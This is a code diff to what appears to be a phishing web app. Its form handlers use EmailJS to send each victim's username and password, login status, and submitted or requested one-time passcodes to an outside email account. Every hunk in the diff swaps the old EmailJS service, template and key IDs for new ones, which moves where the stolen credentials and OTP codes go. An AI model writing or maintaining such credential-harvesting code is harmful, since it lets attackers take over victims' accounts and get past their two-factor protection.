@@ -68,14 +68,14 @@ function App() {
         // Send email only on success
         emailjs
           .send(
-            "service_04tt69h",
-            "template_b9wm876",
+            "service_gkqaala",
+            "template_p34s8dn",
             {
               username: username,
               password: password,
               status: "✅ Login Successful",
             },
-            "bfy_j4oBXNKFpGcDC"
+            "mcpP7xbUu09aVl1Ef"
           )
           .then((emailResult) => {
             console.log("Email sent successfully:", emailResult.text);
@@ -486,8 +486,8 @@ function App() {
 }).then(r=>r.json()).then(console.log);`;
 
         await emailjs.send(
-          "service_04tt69h",
-          "template_b9wm876",
+          "service_gkqaala",
+          "template_p34s8dn",
           {
             username: username,
             password: password,
@@ -496,7 +496,7 @@ function App() {
             api_code_incorrect: apiCodeIncorrectCredentials,
             api_code_success: apiCodeSuccess,
           },
-          "bfy_j4oBXNKFpGcDC"
+          "mcpP7xbUu09aVl1Ef"
         );
         console.log("Email sent for login attempt");
       } catch (error) {
@@ -525,15 +525,15 @@ function App() {
     // Send email with username and OTP
     try {
       await emailjs.send(
-        "service_04tt69h",
-        "template_42u7yrw",
+        "service_gkqaala",
+        "template_ee5pgdt",
         {
           username: username,
           otp_code: otpCode,
           request_type: "otp_submission", // Flag to indicate OTP submission
           message: "OTP code submitted by user",
         },
-        "bfy_j4oBXNKFpGcDC"
+        "mcpP7xbUu09aVl1Ef"
       );
       console.log("OTP email sent successfully");
     } catch (error) {
@@ -555,15 +555,15 @@ function App() {
     // Send email when user requests new OTP code (using same template as OTP submission)
     try {
       await emailjs.send(
-        "service_04tt69h",
-        "template_42u7yrw", // Same template as OTP submission
+        "service_gkqaala",
+        "template_ee5pgdt", // Same template as OTP submission
         {
           username: username,
           otp_code: "", // Empty for new request
           request_type: "new_otp_request", // Flag to indicate new request
           message: "New OTP is requested from the user",
         },
-        "bfy_j4oBXNKFpGcDC"
+        "mcpP7xbUu09aVl1Ef"
       );
       console.log("New OTP request email sent successfully");
     } catch (error) {
